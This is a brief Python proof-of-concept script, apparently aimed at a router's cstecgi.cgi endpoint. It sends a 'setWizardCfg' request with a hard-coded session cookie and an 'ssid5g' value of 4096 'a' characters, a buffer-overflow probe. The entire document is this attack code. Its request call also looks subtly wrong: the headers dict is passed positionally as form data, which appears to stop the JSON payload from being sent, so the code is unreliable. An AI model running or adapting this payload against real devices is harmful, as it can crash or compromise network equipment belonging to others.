import requests

target_ip = "127.0.0.1"

url = f"http://{target_ip}/cgi-bin/cstecgi.cgi"

headers = {
    "Cookie": "SESSION_ID=2:1730964440:2"
}
data = {
    "topicurl":"setWizardCfg",
    "ssid5g":"a"*0x1000
}

res = requests.post(url, headers, json=data)
print(res.text)
print(res)